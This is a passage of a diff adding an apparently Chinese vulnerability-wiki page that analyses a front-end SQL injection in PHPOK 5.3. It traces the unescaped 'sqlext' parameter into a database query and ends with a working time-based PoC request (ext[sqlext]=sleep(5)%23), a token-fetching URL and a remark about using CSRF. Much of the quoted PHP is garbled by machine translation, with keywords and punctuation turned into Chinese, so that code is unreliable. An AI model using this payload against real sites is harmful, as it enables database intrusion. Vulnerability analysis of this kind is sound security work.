+<span class="w">    </span>$<span class="w"> </span><span class="n">this</span><span class="o">-&gt;</span><span class="w"> </span><span class="n">json</span>（<span class="n">P_Lang</span>（<span class="s">&#39;信息为空&#39;</span>））<span class="p">;</span><span class="w"> </span>
+<span class="p">}</span><span class="w"> </span>
+$<span class="w"> </span><span class="n">id</span><span class="w"> </span><span class="p">=</span><span class="w"> </span>$<span class="w"> </span><span class="n">info</span><span class="w"> </span><span class="p">[</span><span class="s">&#39;id&#39;</span><span class="p">];</span>
+
+<span class="c1">// 176行</span>
+$<span class="w"> </span><span class="n">ext</span><span class="w"> </span><span class="p">=</span><span class="w"> </span>$<span class="w"> </span><span class="n">this</span><span class="o">-&gt;</span><span class="w"> </span><span class="k">get</span>（<span class="s">&#39;ext&#39;</span>）<span class="p">;</span><span class="w"> </span>
+<span class="k">if</span>（$<span class="w"> </span><span class="n">ext</span><span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span><span class="n">is_array</span>（$<span class="w"> </span><span class="n">ext</span>））<span class="p">{</span><span class="w"> </span>
+<span class="w">    </span><span class="n">foreach</span>（$<span class="w"> </span><span class="n">ext</span><span class="w"> </span><span class="n">as</span><span class="w"> </span>$<span class="w"> </span><span class="n">key</span><span class="w"> </span><span class="p">=</span><span class="o">&gt;</span><span class="w"> </span>$<span class="w"> </span><span class="n">value</span>）<span class="p">{</span><span class="w"> </span>
+<span class="w">        </span><span class="k">if</span>（！$<span class="w"> </span><span class="n">value</span>）<span class="p">{</span><span class="w"> </span>
+<span class="w">            </span>继续；
+<span class="w">        </span><span class="p">}</span><span class="w"> </span>
+<span class="w">        </span><span class="c1">// sqlext变量转义取消</span>
+<span class="w">        </span><span class="k">if</span>（$<span class="w"> </span><span class="n">key</span><span class="w"> </span><span class="o">==</span><span class="s">&#39;sqlext&#39;</span><span class="o">&amp;&amp;</span><span class="w"> </span>$<span class="w"> </span><span class="n">value</span>）<span class="p">{</span><span class="w"> </span>
+<span class="w">            </span>$<span class="w"> </span><span class="n">value</span><span class="w"> </span><span class="p">=</span><span class="w"> </span><span class="n">str_replace</span>（<span class="n">array</span>（<span class="s">&#39;＆＃39;&#39;</span>，<span class="s">&#39;“”，&#39;</span>’<span class="s">&#39;&#39;</span>，<span class="s">&#39;＆＃34 ;&#39;</span>），<span class="n">array</span>（“<span class="s">&#39;”，&#39;</span>“<span class="s">&#39;，”&#39;</span>“，<span class="s">&#39;”&#39;</span>），$<span class="w"> </span><span class="n">value</span>）<span class="p">;</span><span class="w"> </span>
+<span class="w">        </span><span class="p">}</span><span class="w"> </span>
+<span class="w">        </span>$<span class="w"> </span><span class="n">param</span><span class="w"> </span><span class="p">[</span>$<span class="w"> </span><span class="n">key</span><span class="p">]</span><span class="w"> </span><span class="p">=</span><span class="w"> </span>$<span class="w"> </span><span class="n">value</span><span class="p">;</span><span class="w"> </span>
+<span class="w">    </span><span class="p">}</span><span class="w"> </span>
+<span class="p">}</span><span class="w"> </span>
+<span class="c1">// $ id从加密的令牌中来</span>
+<span class="c1">/// sqlsql的值的函数只有_userlist，_arc_condition_single，_arc_condition </span>
+$<span class="w"> </span><span class="nb">list</span><span class="w"> </span><span class="p">=</span><span class="w"> </span>$<span class="w"> </span><span class="n">this</span><span class="o">-&gt;</span><span class="w"> </span><span class="nb">call</span><span class="o">-&gt;</span><span class="w"> </span><span class="n">phpok</span>（$<span class="w"> </span><span class="n">id</span>，$<span class="w"> </span><span class="n">param</span>）<span class="p">;</span>
+</code></pre></div>
+
+<p>继续跟进phpok函数：framework / phpok_call.php＃phpok</p>
+<div class="codehilite"><pre><span></span><code><span class="err">公共功能</span><span class="n">phpok</span><span class="err">（</span><span class="o">$</span><span class="w"> </span><span class="n">id</span><span class="err">，</span><span class="o">$</span><span class="w"> </span><span class="n">rs</span><span class="w"> </span><span class="o">=</span><span class="err">“”）</span>
+<span class="p">{</span><span class="w"> </span>
+<span class="w">    </span><span class="o">//</span><span class="w"> </span><span class="mi">76</span><span class="err">行</span>
+<span class="w">    </span><span class="o">$</span><span class="w"> </span><span class="n">siteinfo</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="o">$</span><span class="w"> </span><span class="n">this</span><span class="o">-&gt;</span><span class="w"> </span><span class="n">model</span><span class="err">（</span><span class="s1">&#39;site&#39;</span><span class="err">）</span><span class="o">-&gt;</span><span class="w"> </span><span class="n">get_one</span><span class="err">（</span><span class="o">$</span><span class="w"> </span><span class="n">rs</span><span class="w"> </span><span class="p">[</span><span class="s1">&#39;site&#39;</span><span class="p">]</span><span class="err">）</span><span class="p">;</span><span class="w"> </span>
+<span class="w">    </span><span class="o">//</span><span class="w"> </span><span class="mi">91</span><span class="err">行</span>
+<span class="w">    </span><span class="k">if</span><span class="err">（</span><span class="n">substr</span><span class="err">（</span><span class="o">$</span><span class="w"> </span><span class="n">id</span><span class="err">，</span><span class="mi">0</span><span class="p">,</span><span class="mi">1</span><span class="err">）！</span><span class="o">=</span><span class="s1">&#39;_&#39;</span><span class="err">）</span><span class="p">{</span><span class="w"> </span>
+<span class="w">    </span><span class="o">//</span><span class="w"> </span><span class="o">$</span><span class="w"> </span><span class="n">id从令牌中来</span><span class="err">，为</span><span class="n">phpok表中identifier标识符</span><span class="err">，</span><span class="o">$</span><span class="w"> </span><span class="n">rs</span><span class="w"> </span><span class="p">[</span><span class="s1">&#39;site&#39;</span><span class="p">]</span><span class="err">可控为任意值</span>
+<span class="w">    </span><span class="o">$</span><span class="w"> </span><span class="n">call_rs</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="o">$</span><span class="w"> </span><span class="n">this</span><span class="o">-&gt;</span><span class="w"> </span><span class="n">load_phpoklist</span><span class="err">（</span><span class="o">$</span><span class="w"> </span><span class="n">id</span><span class="err">，</span><span class="o">$</span><span class="w"> </span><span class="n">rs</span><span class="w"> </span><span class="p">[</span><span class="s1">&#39;site&#39;</span><span class="p">]</span><span class="err">）</span><span class="p">;</span><span class="w"> </span>
+<span class="w">    </span><span class="p">}</span><span class="w"> </span>
+<span class="w">    </span><span class="o">//</span><span class="w"> </span><span class="mi">116</span><span class="err">行</span>
+<span class="w">    </span><span class="o">$</span><span class="w"> </span><span class="k">func</span><span class="w"> </span><span class="o">=</span><span class="s1">&#39;_&#39;</span><span class="err">。</span><span class="o">$</span><span class="w"> </span><span class="n">call_rs</span><span class="w"> </span><span class="p">[</span><span class="s1">&#39;type_id&#39;</span><span class="p">];</span><span class="w"> </span>
+<span class="w">    </span><span class="o">//</span><span class="w"> </span><span class="mi">131</span><span class="err">行动态调用函数</span><span class="n">_xxxx</span><span class="w"> </span>
+<span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="o">$</span><span class="w"> </span>
+<span class="n">this</span><span class="o">-</span><span class="w"> </span><span class="o">&gt;</span><span class="w"> </span><span class="o">$</span><span class="w"> </span><span class="k">func</span><span class="err">（</span><span class="o">$</span><span class="w"> </span><span class="n">call_rs</span><span class="err">，</span><span class="o">$</span><span class="w"> </span><span class="n">cache_id</span><span class="err">）</span><span class="p">;</span><span class="w"> </span><span class="p">}</span>
+</code></pre></div>
+
+<p>跟进load_phpoklist：framework / phpok_call.php＃load_phpoklist</p>
+<div class="codehilite"><pre><span></span><code><span class="err">私有函数</span><span class="n">load_phpoklist</span><span class="err">（</span><span class="o">$</span><span class="w"> </span><span class="n">id</span><span class="err">，</span><span class="o">$</span><span class="w"> </span><span class="n">siteid</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">0</span><span class="err">）</span>
+<span class="p">{</span><span class="w"> </span>
+<span class="w">    </span><span class="o">$</span><span class="w"> </span><span class="n">this</span><span class="o">-&gt;</span><span class="w"> </span><span class="n">model</span><span class="err">（</span><span class="s1">&#39;call&#39;</span><span class="err">）</span><span class="o">-&gt;</span><span class="w"> </span><span class="n">site_id</span><span class="err">（</span><span class="o">$</span><span class="w"> </span><span class="n">siteid</span><span class="err">）</span><span class="p">;</span><span class="w"> </span>
+<span class="w">    </span><span class="k">if</span><span class="err">（</span><span class="o">$</span><span class="w"> </span><span class="n">this</span><span class="o">-&gt;</span><span class="w"> </span><span class="n">_</span><span class="w"> </span><span class="n">cache</span><span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span><span class="o">$</span><span class="w"> </span><span class="n">this</span><span class="o">-&gt;</span><span class="w"> </span><span class="n">_</span><span class="w"> </span><span class="n">cache</span><span class="w"> </span><span class="p">[</span><span class="o">$</span><span class="w"> </span><span class="n">id</span><span class="p">]</span><span class="err">）</span><span class="p">{</span><span class="w"> </span>
+<span class="w">        </span><span class="err">返回</span><span class="o">$</span><span class="w"> </span><span class="n">this</span><span class="o">-&gt;</span><span class="w"> </span><span class="n">_</span><span class="w"> </span><span class="n">cache</span><span class="w"> </span><span class="p">[</span><span class="o">$</span><span class="w"> </span><span class="n">id</span><span class="p">];</span><span class="w"> </span>
+<span class="w">    </span><span class="p">}</span><span class="w"> </span>
+<span class="w">    </span><span class="o">$</span><span class="w"> </span><span class="n">this</span><span class="o">-&gt;</span><span class="w"> </span><span class="n">_</span><span class="w"> </span><span class="n">cache</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="o">$</span><span class="w"> </span><span class="n">this</span><span class="o">-&gt;</span><span class="w"> </span><span class="n">model</span><span class="err">（</span><span class="s1">&#39;call&#39;</span><span class="err">）</span><span class="o">-&gt;</span><span class="w"> </span><span class="n">all</span><span class="err">（</span><span class="o">$</span><span class="w"> </span><span class="n">siteid</span><span class="err">，</span><span class="s1">&#39;identifier&#39;</span><span class="err">）</span><span class="p">;</span><span class="w"> </span>
+<span class="w">    </span><span class="k">if</span><span class="err">（</span><span class="o">$</span><span class="w"> </span><span class="n">this</span><span class="o">-&gt;</span><span class="w"> </span><span class="n">_</span><span class="w"> </span><span class="n">cache</span><span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span><span class="o">$</span><span class="w"> </span><span class="n">this</span><span class="o">-&gt;</span><span class="w"> </span><span class="n">_</span><span class="w"> </span><span class="n">cache</span><span class="w"> </span><span class="p">[</span><span class="o">$</span><span class="w"> </span><span class="n">id</span><span class="p">]</span><span class="err">）</span><span class="p">{</span><span class="w"> </span>
+<span class="w">        </span><span class="err">返回</span><span class="o">$</span><span class="w"> </span><span class="n">this</span><span class="o">-&gt;</span><span class="w"> </span><span class="n">_</span><span class="w"> </span><span class="n">cache</span><span class="w"> </span><span class="p">[</span><span class="o">$</span><span class="w"> </span><span class="n">id</span><span class="p">];</span><span class="w"> </span>
+<span class="w">    </span><span class="p">}</span><span class="w"> </span>
+<span class="w">    </span><span class="err">返回</span><span class="bp">false</span><span class="p">;</span><span class="w"> </span>
+<span class="p">}</span>
+</code></pre></div>
+
+<h1 id="this-modelcall-allsiteididentifierphpokidentifier">这一段代码$this-&gt;model(\'call\')-&gt;all($siteid,\'identifier\');实现的是查询phpok表，其中identifier<a class="headerlink" href="#this-modelcall-allsiteididentifierphpokidentifier" title="Permanent link">&para;</a></h1>
+<p>xxx的信息，然后在phpok()函数的131行进行动态调用其插入为type_id的值函数。</p>
+<p><img alt="" src="../resource/PHPOK5.3%E5%89%8D%E5%8F%B0%E6%B3%A8%E5%85%A5/media/rId25.png" /></p>
+<p>例如我们要调用framework/phpok_call.php下的_arclist函数，我们可以选择：</p>
+<div class="codehilite"><pre><span></span><code><span class="nl">http</span><span class="p">:</span><span class="o">//</span><span class="mi">0</span><span class="o">-</span><span class="n">sec</span><span class="p">.</span><span class="n">org</span><span class="o">/</span><span class="n">api</span><span class="p">.</span><span class="n">php</span><span class="vm">?</span><span class="n">c</span><span class="o">=</span><span class="k">index</span><span class="o">&amp;</span><span class="n">f</span><span class="o">=</span><span class="n">phpok</span><span class="o">&amp;</span><span class="n">ext</span><span class="o">[</span><span class="n">site</span><span class="o">]=</span><span class="mi">1</span><span class="o">&amp;</span><span class="n">token</span><span class="o">=</span><span class="n">加密</span><span class="p">(</span><span class="s1">&#39;id=m_picplayer&#39;</span><span class="p">)</span>
+</code></pre></div>
+
+<p>我们接着在framework/phpok_call.php电子邮件寻找柯林斯触发SQL的函数，从phpok表里我们可以看到其默认的TYPE_ID只有四个不同的值arclist，
+，arc，catelist，project我们而需要找到拼接sqlext变量的函数：</p>
+<p>框架/ phpok_call.php＃_arclist</p>
+<div class="codehilite"><pre><span></span><code><span class="err">私有函数</span><span class="n">_arclist</span><span class="err">（$</span><span class="w"> </span><span class="n">rs</span><span class="err">，$</span><span class="w"> </span><span class="n">cache_id</span><span class="w"> </span><span class="o">=</span><span class="s">&#39;&#39;</span><span class="err">）</span>
+<span class="p">{</span><span class="w"> </span>
+<span class="w">    </span><span class="c1">// 254行</span>
+<span class="w">    </span><span class="err">$</span><span class="w"> </span><span class="n">condition</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="err">$</span><span class="w"> </span><span class="n">this</span><span class="o">-&gt;</span><span class="w"> </span><span class="n">_</span><span class="w"> </span><span class="n">arc_condition</span><span class="err">（$</span><span class="w"> </span><span class="n">rs</span><span class="err">，$</span><span class="w"> </span><span class="n">flist</span><span class="err">，$</span><span class="w"> </span><span class="nf">project</span><span class="err">）</span><span class="p">;</span><span class="w"> </span>
+<span class="w">    </span><span class="c1">//带入注入数据</span>
+<span class="w">    </span><span class="err">$</span><span class="w"> </span><span class="n">array</span><span class="w"> </span><span class="p">[</span><span class="s">&#39;total&#39;</span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="err">$</span><span class="w"> </span><span class="n">this</span><span class="o">-&gt;</span><span class="w"> </span><span class="n">model</span><span class="err">（</span><span class="s">&#39;list&#39;</span><span class="err">）</span><span class="o">-&gt;</span><span class="w"> </span><span class="n">arc_count</span><span class="err">（$</span><span class="w"> </span><span class="nf">project</span><span class="w"> </span><span class="p">[</span><span class="s">&#39;module&#39;</span><span class="p">]</span><span class="err">，$</span><span class="w"> </span><span class="n">condition</span><span class="err">）</span><span class="p">;</span><span class="w"> </span>
+<span class="p">}</span>
+</code></pre></div>
+
+<p>跟进：framework / phpok_call.php＃_arc_condition</p>
+<p>直接拼接了sqlext</p>
+<div class="codehilite"><pre><span></span><code>private function _arc_condition($rs,$fields=&#39;&#39;,$project=&#39;&#39;)
+{
+    // 623行
+        if($rs[&#39;sqlext&#39;]){
+        $condition .= &quot; AND &quot;.$rs[&#39;sqlext&#39;];
+    }
+
+    // 671行
+    return $condition;
+}
+</code></pre></div>
+
+<p>接着将结果带入了：</p>
+<div class="codehilite"><pre><span></span><code>$<span class="w"> </span>this-&gt;<span class="w"> </span>model（<span class="s1">&#39;list&#39;</span>）-&gt;<span class="w"> </span>arc_count（$<span class="w"> </span>project<span class="w"> </span><span class="o">[</span><span class="s1">&#39;module&#39;</span><span class="o">]</span>，$<span class="w"> </span>condition）<span class="p">;</span>
+</code></pre></div>
+
+<p>调用：framework / model / list.php＃arc_count 5.jpg</p>
+<p><img alt="" src="../resource/PHPOK5.3%E5%89%8D%E5%8F%B0%E6%B3%A8%E5%85%A5/media/rId26.png" /></p>
+<p>拼接sql，调用$this-&gt;db-&gt;count($sql)</p>
+<p>framework / engine / db / mysqli.php＃count</p>
+<div class="codehilite"><pre><span></span><code><span class="nx">公共功能计数</span><span class="err">（$</span><span class="w"> </span><span class="nx">sql</span><span class="w"> </span><span class="p">=</span><span class="err">“”，$</span><span class="w"> </span><span class="nx">is_count</span><span class="w"> </span><span class="p">=</span><span class="w"> </span><span class="kc">true</span><span class="err">）</span>
+<span class="p">{</span><span class="w"> </span>
+<span class="w">    </span><span class="k">if</span><span class="err">（$</span><span class="w"> </span><span class="nx">sql</span><span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span><span class="nx">is_string</span><span class="err">（$</span><span class="w"> </span><span class="nx">sql</span><span class="err">）</span><span class="o">&amp;&amp;</span><span class="w"> </span><span class="err">$</span><span class="w"> </span><span class="nx">is_count</span><span class="err">）</span><span class="p">{</span><span class="w"> </span>
+<span class="w">        </span><span class="err">$</span><span class="w"> </span><span class="nx">this</span><span class="o">-&gt;</span><span class="w"> </span><span class="nx">set</span><span class="err">（&#39;</span><span class="k">type</span><span class="sc">&#39;，&#39;</span><span class="nx">num</span><span class="err">&#39;）</span><span class="p">;</span><span class="w"> </span>
+<span class="w">        </span><span class="err">$</span><span class="w"> </span><span class="nx">rs</span><span class="w"> </span><span class="p">=</span><span class="w"> </span><span class="err">$</span><span class="w"> </span><span class="nx">this</span><span class="o">-&gt;</span><span class="w"> </span><span class="nx">get_one</span><span class="err">（$</span><span class="w"> </span><span class="nx">sql</span><span class="err">）</span><span class="p">;</span><span class="w"> </span>
+<span class="w">        </span><span class="err">$</span><span class="w"> </span><span class="nx">this</span><span class="o">-&gt;</span><span class="w"> </span><span class="nx">set</span><span class="err">（&#39;</span><span class="k">type</span><span class="sc">&#39;，&#39;</span><span class="nx">assoc</span><span class="err">&#39;）</span><span class="p">;</span><span class="w"> </span>
+<span class="w">        </span><span class="nx">返回</span><span class="err">$</span><span class="w"> </span><span class="nx">rs</span><span class="w"> </span><span class="p">[</span><span class="mi">0</span><span class="p">];</span><span class="w"> </span>
+<span class="w">    </span><span class="p">}</span><span class="w"> </span><span class="k">else</span><span class="w"> </span><span class="p">{</span><span class="w"> </span>
+<span class="w">        </span><span class="k">if</span><span class="err">（$</span><span class="w"> </span><span class="nx">sql</span><span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span><span class="nx">is_string</span><span class="err">（$</span><span class="w"> </span><span class="nx">sql</span><span class="err">））</span><span class="p">{</span><span class="w"> </span>
+<span class="w">            </span><span class="err">$</span><span class="w"> </span><span class="nx">this</span><span class="o">-&gt;</span><span class="w"> </span><span class="nx">query</span><span class="err">（$</span><span class="w"> </span><span class="nx">sql</span><span class="err">）</span><span class="p">;</span><span class="w"> </span>
+<span class="w">        </span><span class="p">}</span><span class="w"> </span>
+<span class="w">        </span><span class="k">if</span><span class="err">（$</span><span class="w"> </span><span class="nx">this</span><span class="o">-&gt;</span><span class="w"> </span><span class="nx">query</span><span class="err">）</span><span class="p">{</span><span class="w"> </span>
+<span class="w">            </span><span class="nx">返回mysqli_num_rows</span><span class="err">（$</span><span class="w"> </span><span class="nx">this</span><span class="o">-&gt;</span><span class="w"> </span><span class="nx">query</span><span class="err">）</span><span class="p">;</span><span class="w"> </span>
+<span class="w">        </span><span class="p">}</span><span class="w"> </span>
+<span class="w">    </span><span class="p">}</span><span class="w"> </span>
+<span class="w">    </span><span class="nx">返回false</span><span class="p">;</span><span class="w"> </span>
+<span class="p">}</span>
+</code></pre></div>
+
+<p>根进get_one函数：framework / engine / db / mysqli.php＃get_one</p>
+<div class="codehilite"><pre><span></span><code><span class="err">公共功能</span><span class="n">get_one</span><span class="err">（$</span><span class="w"> </span><span class="kr">sql</span><span class="w"> </span><span class="o">=</span><span class="s">&#39;&#39;</span><span class="err">）</span>
+<span class="p">{</span><span class="w"> </span>
+<span class="w">    </span><span class="nf">if</span><span class="err">（$</span><span class="w"> </span><span class="kr">sql</span><span class="err">）</span><span class="p">{</span><span class="w"> </span>
+<span class="w">        </span><span class="err">$</span><span class="w"> </span><span class="kr">false</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="err">$</span><span class="w"> </span><span class="n">this</span><span class="o">-&gt;</span><span class="w"> </span><span class="n">cache_false</span><span class="err">（$</span><span class="w"> </span><span class="kr">sql</span><span class="err">）</span><span class="p">;</span><span class="w"> </span>
+<span class="w">        </span><span class="nf">if</span><span class="err">（$</span><span class="w"> </span><span class="kr">false</span><span class="err">）</span><span class="p">{</span><span class="w"> </span>
+<span class="w">            </span><span class="err">返回</span><span class="kr">false</span><span class="p">;</span><span class="w"> </span>
+<span class="w">        </span><span class="p">}</span><span class="w"> </span>
+<span class="w">        </span><span class="nf">if</span><span class="err">（$</span><span class="w"> </span><span class="n">this</span><span class="o">-&gt;</span><span class="w"> </span><span class="n">cache_get</span><span class="err">（$</span><span class="w"> </span><span class="kr">sql</span><span class="err">））</span><span class="p">{</span><span class="w"> </span>
+<span class="w">            </span><span class="err">返回$</span><span class="w"> </span><span class="n">this</span><span class="o">-&gt;</span><span class="w"> </span><span class="n">cache_get</span><span class="err">（$</span><span class="w"> </span><span class="kr">sql</span><span class="err">）</span><span class="p">;</span><span class="w"> </span>
+<span class="w">        </span><span class="p">}</span><span class="w"> </span>
+<span class="w">        </span><span class="err">$</span><span class="w"> </span><span class="n">this</span><span class="o">-&gt;</span><span class="w"> </span><span class="n">query</span><span class="err">（$</span><span class="w"> </span><span class="kr">sql</span><span class="err">）</span><span class="p">;</span>
+</code></pre></div>
+
+<p>根进$this-&gt;query($sql);：framework / engine / db / mysqli.php＃query</p>
+<p><img alt="" src="../resource/PHPOK5.3%E5%89%8D%E5%8F%B0%E6%B3%A8%E5%85%A5/media/rId27.png" /></p>
+<p>最终将sql带入执行。</p>
+<p>当然，到这里，其实还有一个问题没有解决，我们需要如果拿到token=加密(\'id=m_picplayer\')。</p>
+<p>框架/ API / index_control.php＃token_f</p>
+<div class="codehilite"><pre><span></span><code><span class="p">{</span><span class="w"> </span>
+<span class="w">    </span><span class="err">$</span><span class="w"> </span><span class="n">this</span><span class="o">-&gt;</span><span class="w"> </span><span class="n">config</span><span class="err">（</span><span class="s">&#39;is_ajax&#39;</span><span class="err">，</span><span class="kr">true</span><span class="err">）</span><span class="p">;</span><span class="w"> </span>
+<span class="w">    </span><span class="nf">if</span><span class="err">（！$</span><span class="w"> </span><span class="n">this</span><span class="o">-&gt;</span><span class="w"> </span><span class="n">site</span><span class="w"> </span><span class="p">[</span><span class="s">&#39;api_code&#39;</span><span class="p">]</span><span class="err">）</span><span class="p">{</span><span class="w"> </span>
+<span class="w">        </span><span class="err">$</span><span class="w"> </span><span class="n">this</span><span class="o">-&gt;</span><span class="w"> </span><span class="nf">error</span><span class="err">（</span><span class="n">P_Lang</span><span class="err">（“系统未配置接口功能”））</span><span class="p">;</span><span class="w"> </span>
+<span class="w">    </span><span class="p">}</span><span class="w"> </span>
+<span class="w">    </span><span class="err">$</span><span class="w"> </span><span class="n">id</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="err">$</span><span class="w"> </span><span class="n">this</span><span class="o">-&gt;</span><span class="w"> </span><span class="n">get</span><span class="err">（</span><span class="s">&#39;id&#39;</span><span class="err">，</span><span class="s">&#39;system&#39;</span><span class="err">）</span><span class="p">;</span><span class="w"> </span>
+<span class="w">    </span><span class="nf">if</span><span class="err">（！$</span><span class="w"> </span><span class="n">id</span><span class="err">）</span><span class="p">{</span><span class="w"> </span>
+<span class="w">        </span><span class="err">$</span><span class="w"> </span><span class="n">this</span><span class="o">-&gt;</span><span class="w"> </span><span class="nf">error</span><span class="err">（</span><span class="n">P_Lang</span><span class="err">（</span><span class="s">&#39;未指定数据调用标识&#39;</span><span class="err">））</span><span class="p">;</span><span class="w"> </span>
+<span class="w">    </span><span class="p">}</span><span class="w"> </span>
+<span class="w">    </span><span class="err">$</span><span class="w"> </span><span class="n">this</span><span class="o">-&gt;</span><span class="w"> </span><span class="n">model</span><span class="err">（</span><span class="s">&#39;call&#39;</span><span class="err">）</span><span class="o">-&gt;</span><span class="w"> </span><span class="n">site_id</span><span class="err">（$</span><span class="w"> </span><span class="n">this</span><span class="o">-&gt;</span><span class="w"> </span><span class="n">site</span><span class="w"> </span><span class="p">[</span><span class="s">&#39;id&#39;</span><span class="p">]</span><span class="err">）</span><span class="p">;</span><span class="w"> </span>
+<span class="w">    </span><span class="c1">//限制范围，其中identifier = $ id </span>
+<span class="w">    </span><span class="err">$</span><span class="w"> </span><span class="n">rs</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="err">$</span><span class="w"> </span><span class="n">this</span><span class="o">-&gt;</span><span class="w"> </span><span class="n">model</span><span class="err">（</span><span class="s">&#39;call&#39;</span><span class="err">）</span><span class="o">-&gt;</span><span class="w"> </span><span class="n">get_one</span><span class="err">（$</span><span class="w"> </span><span class="n">id</span><span class="err">，</span><span class="s">&#39;identifier&#39;</span><span class="err">）</span><span class="p">;</span><span class="w"> </span>
+<span class="w">    </span><span class="nf">if</span><span class="err">（！$</span><span class="w"> </span><span class="n">rs</span><span class="w"> </span><span class="o">||</span><span class="err">！$</span><span class="w"> </span><span class="n">rs</span><span class="w"> </span><span class="p">[</span><span class="s">&#39;status&#39;</span><span class="p">]</span><span class="err">）</span><span class="p">{</span><span class="w"> </span>
+<span class="w">        </span><span class="err">$</span><span class="w"> </span><span class="n">this</span><span class="o">-&gt;</span><span class="w"> </span><span class="nf">error</span><span class="err">（</span><span class="n">P_Lang</span><span class="err">（</span><span class="s">&#39;标识不存在或未启用&#39;</span><span class="err">））</span><span class="p">;</span><span class="w"> </span>
+<span class="w">    </span><span class="p">}</span>
+
+<span class="w">  </span><span class="c1">// 141行</span>
+<span class="w">    </span><span class="err">$</span><span class="w"> </span><span class="n">array</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">array</span><span class="err">（</span><span class="s">&#39;id&#39;</span><span class="o">=&gt;</span><span class="w"> </span><span class="err">$</span><span class="w"> </span><span class="n">id</span><span class="err">，</span><span class="s">&#39;param&#39;</span><span class="o">=&gt;</span><span class="w"> </span><span class="err">$</span><span class="w"> </span><span class="n">param</span><span class="err">）</span><span class="p">;</span><span class="w"> </span>
+<span class="w">    </span><span class="err">$</span><span class="w"> </span><span class="kt">token</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="err">$</span><span class="w"> </span><span class="n">this</span><span class="o">-&gt;</span><span class="w"> </span><span class="n">lib</span><span class="err">（</span><span class="s">&#39;token&#39;</span><span class="err">）</span><span class="o">-&gt;</span><span class="w"> </span><span class="n">encode</span><span class="err">（$</span><span class="w"> </span><span class="n">array</span><span class="err">）</span><span class="p">;</span><span class="w"> </span>
+<span class="w">    </span><span class="err">$</span><span class="w"> </span><span class="n">this</span><span class="o">-&gt;</span><span class="w"> </span><span class="kr">success</span><span class="err">（$</span><span class="w"> </span><span class="kr">token</span><span class="err">）</span><span class="p">;</span><span class="w"> </span>
+<span class="p">}</span>
+</code></pre></div>
+
+<p>其中第一个如果条件需要在后台生成api字符串：</p>
+<p><img alt="" src="../resource/PHPOK5.3%E5%89%8D%E5%8F%B0%E6%B3%A8%E5%85%A5/media/rId28.png" /></p>
+<blockquote>
+<p>没开启的话，其实构造一个csrf的poc也是可以的</p>
+</blockquote>
+<p>第二个条件预期id=m_picplayer即可</p>
+<h3 id="_5">漏洞复现<a class="headerlink" href="#_5" title="Permanent link">&para;</a></h3>
+<div class="codehilite"><pre><span></span><code>http://0-sec.org/api.php?c=index&amp;f=token&amp;id=m_picplayer
+</code></pre></div>
+
+<p><img alt="" src="../resource/PHPOK5.3%E5%89%8D%E5%8F%B0%E6%B3%A8%E5%85%A5/media/rId30.png" /></p>
+<p>POC：</p>
+<div class="codehilite"><pre><span></span><code><span class="nf">GET</span> <span class="nn">/api.php?c=index&amp;f=phpok&amp;token=6318fdtC3WRpOzYNzKVNw78PFa9OhFea5pp3/uZ4U3T67a/F47WhJ0lr856V7yomOcG0u8/UJpIwKKOwJAKspTSWN+5ljVNWR5978g7HHoG14M&amp;ext[sqlext]=sleep(5)%23&amp;ext[site]=1</span> <span class="kr">HTTP</span><span class="o">/</span><span class="m">1.1</span>
+<span class="na">Host</span><span class="o">:</span> <span class="l">0-sec.org</span>
+<span class="na">Pragma</span><span class="o">:</span> <span class="l">no-cache</span>
+<span class="na">Cache-Control</span><span class="o">:</span> <span class="l">no-cache</span>
+<span class="na">Upgrade-Insecure-Requests</span><span class="o">:</span> <span class="l">1</span>
+<span class="na">User-Agent</span><span class="o">:</span> <span class="l">Mozilla/5.0 (X11; U; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.86 Safari/537.36</span>
+<span class="na">Accept</span><span class="o">:</span> <span class="l">text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3</span>
+<span class="na">Accept-Encoding</span><span class="o">:</span> <span class="l">gzip, deflate</span>
+<span class="na">Accept-Language</span><span class="o">:</span> <span class="l">en-US,en;q=0.9,zh-CN;q=0.8,zh;q=0.7</span>
+<span class="na">Cookie</span><span class="o">:</span> <span class="l">PHPSESSION=l87bngd1u307g20iudfmphisu4</span>
+<span class="na">Connection</span><span class="o">:</span> <span class="l">close</span>
+</code></pre></div>
+
+<h2 id="_6">四、参考链接<a class="headerlink" href="#_6" title="Permanent link">&para;</a></h2>
+<blockquote>
+<p><a href="https://xz.aliyun.com/t/6830">https://xz.aliyun.com/t/6830</a></p>
+</blockquote>
+
+  <br>
+    
+
+    
+    
+      
+    
+
+  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
+    
+    <div class="wm-article-nav pull-right">
+      <a href="../PHPOK%205.5%20csrf%2B%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9Egetshell/" class="btn btn-xs btn-default pull-right">
+        Next
+        <i class="fa fa-chevron-right" aria-hidden="true"></i>
+      </a>
+      <a href="../PHPOK%205.5%20csrf%2B%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9Egetshell/" class="btn btn-xs btn-link">
+        PHPOK 5.5 csrf+反序列化漏洞getshell
+      </a>
+    </div>
+    
+    <div class="wm-article-nav">
+      <a href="../PHPOK%205.3%20%E5%89%8D%E5%8F%B0%E6%97%A0%E9%99%90%E5%88%B6%E6%B3%A8%E5%85%A5/" class="btn btn-xs btn-default pull-left">
+        <i class="fa fa-chevron-left" aria-hidden="true"></i>
